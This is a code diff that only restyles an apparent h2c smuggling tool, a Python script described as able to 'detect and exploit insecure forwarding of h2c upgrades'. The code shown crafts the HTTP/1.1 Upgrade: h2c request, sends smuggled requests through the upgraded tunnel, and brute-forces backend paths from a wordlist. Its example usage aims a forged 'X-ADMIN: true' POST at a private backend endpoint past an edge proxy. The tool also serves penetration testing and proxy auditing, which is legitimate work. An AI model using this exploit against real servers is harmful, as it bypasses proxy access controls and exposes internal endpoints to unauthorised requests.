@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 import h2.connection
-from h2.events import (
-    ResponseReceived, DataReceived, StreamReset, StreamEnded
-)
+from h2.events import (ResponseReceived, DataReceived, StreamReset,
+                       StreamEnded)
 
 import argparse
 import multiprocessing.dummy as mp
@@ -63,19 +62,15 @@ def send_initial_request(connection, proxy_url, settings):
         addl_conn_str = b""
 
     request = (
-        b"GET " + path.encode('utf-8') + b" HTTP/1.1\r\n" +
-        b"Host: " + proxy_url.hostname.encode('utf-8') + b"\r\n" +
-        b"Accept: */*\r\n" +
-        b"Accept-Language: en\r\n" +
-        b"Upgrade: h2c\r\n" +
+        b"GET " + path.encode('utf-8') + b" HTTP/1.1\r\n" + b"Host: " +
+        proxy_url.hostname.encode('utf-8') + b"\r\n" + b"Accept: */*\r\n" +
+        b"Accept-Language: en\r\n" + b"Upgrade: h2c\r\n" +
         # b"HTTP2-Settings: " + settings + b"\r\n" +
         #
         # hyper-h2 base64-encoded settings contain '_' chars, which although
         # allowed by spec triggered errors on some faulty h2c implementatons.
         b"HTTP2-Settings: " + b"AAMAAABkAARAAAAAAAIAAAAA" + b"\r\n" +
-        b"Connection: Upgrade" + addl_conn_str + b"\r\n" +
-        b"\r\n"
-    )
+        b"Connection: Upgrade" + addl_conn_str + b"\r\n" + b"\r\n")
     connection.sendall(request)
 
 
@@ -148,8 +143,8 @@ def sendData(h2_connection, connection, data, stream_id):
     connection.write(h2_connection.data_to_send())
 
 
-def sendSmuggledRequest(h2_connection, connection,
-                        smuggled_request_headers, args):
+def sendSmuggledRequest(h2_connection, connection, smuggled_request_headers,
+                        args):
 
     stream_id = h2_connection.get_next_available_stream_id()
 
@@ -161,9 +156,7 @@ def sendSmuggledRequest(h2_connection, connection,
     connection.sendall(h2_connection.data_to_send())
 
     if args.data:
-        sendData(h2_connection,
-                 connection,
-                 args.data.encode("UTF-8"),
+        sendData(h2_connection, connection, args.data.encode("UTF-8"),
                  stream_id)
 
     # Custom Step 4: Receive data and process
@@ -211,8 +204,10 @@ def main(args):
     # Craft request headers and grab next available stream id
     if args.wordlist:
         with open(args.wordlist) as fd:
-            urls = [urlparse(urljoin(args.url, url.strip()))
-                    for url in fd.readlines()]
+            urls = [
+                urlparse(urljoin(args.url, url.strip()))
+                for url in fd.readlines()
+            ]
     else:
         urls = [urlparse(args.url)]
 
@@ -233,10 +228,8 @@ def main(args):
 
         # Send request
         print("[INFO] Requesting - " + path)
-        sendSmuggledRequest(h2_connection,
-                            connection,
-                            smuggled_request_headers,
-                            args)
+        sendSmuggledRequest(h2_connection, connection,
+                            smuggled_request_headers, args)
 
     # Terminate connection
     h2_connection.close_connection()
@@ -255,8 +248,7 @@ def scan(line):
         h2_connection = h2.connection.H2Connection()
         settings_header_value = h2_connection.initiate_upgrade_connection()
 
-        send_initial_request(connection, proxy_url,
-                             settings_header_value)
+        send_initial_request(connection, proxy_url, settings_header_value)
         get_upgrade_response(connection)
 
         print("[INFO] Success! " + line + " can be used for tunneling")
@@ -280,15 +272,13 @@ def init():
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
         description="Detect and exploit insecure forwarding of h2c upgrades.",
-        epilog="Example Usage:\n"
-               + sys.argv[0] + " --scan-list urls.txt --threads 5\n"
-               + sys.argv[0] + " -x https://edgeserver http://localhost\n"
-               + sys.argv[0] + " -x https://edgeserver -XPOST -d "
-               "'{\"data\":1}' -H \"Content-Type: application/json\""
-               "-H \"X-ADMIN: true\" http://backend/private/endpoint"
-    )
-    parser.add_argument("--scan-list",
-                        help="list of URLs for scanning")
+        epilog="Example Usage:\n" + sys.argv[0] +
+        " --scan-list urls.txt --threads 5\n" + sys.argv[0] +
+        " -x https://edgeserver http://localhost\n" + sys.argv[0] +
+        " -x https://edgeserver -XPOST -d "
+        "'{\"data\":1}' -H \"Content-Type: application/json\""
+        "-H \"X-ADMIN: true\" http://backend/private/endpoint")
+    parser.add_argument("--scan-list", help="list of URLs for scanning")
     parser.add_argument("--threads",
                         type=int,
                         default=5,
@@ -297,29 +287,26 @@ def init():
                         default=False,
                         action="store_true",
                         help="drop HTTP2-Settings from outgoing "
-                             "Connection header")
-    parser.add_argument("-x", "--proxy",
-                        help="proxy server to try to bypass")
-    parser.add_argument("-i", "--wordlist",
-                        help="list of paths to bruteforce")
-    parser.add_argument("-X", "--request",
-                        default="GET",
-                        help="smuggled verb")
-    parser.add_argument("-d", "--data",
-                        help="smuggled data")
-    parser.add_argument("-H", "--header",
+                        "Connection header")
+    parser.add_argument("-x", "--proxy", help="proxy server to try to bypass")
+    parser.add_argument("-i", "--wordlist", help="list of paths to bruteforce")
+    parser.add_argument("-X", "--request", default="GET", help="smuggled verb")
+    parser.add_argument("-d", "--data", help="smuggled data")
+    parser.add_argument("-H",
+                        "--header",
                         action="append",
                         help="smuggled headers")
-    parser.add_argument("-m", "--max-time",
+    parser.add_argument("-m",
+                        "--max-time",
                         type=float,
                         default=10,
                         help="socket timeout in seconds "
-                             "(type: float; default 10)")
-    parser.add_argument("-t", "--test",
+                        "(type: float; default 10)")
+    parser.add_argument("-t",
+                        "--test",
                         help="test a single proxy server",
                         action="store_true")
-    parser.add_argument("-v", "--verbose",
-                        action="store_true")
+    parser.add_argument("-v", "--verbose", action="store_true")
     parser.add_argument("url", nargs="?")
     args = parser.parse_args()
 
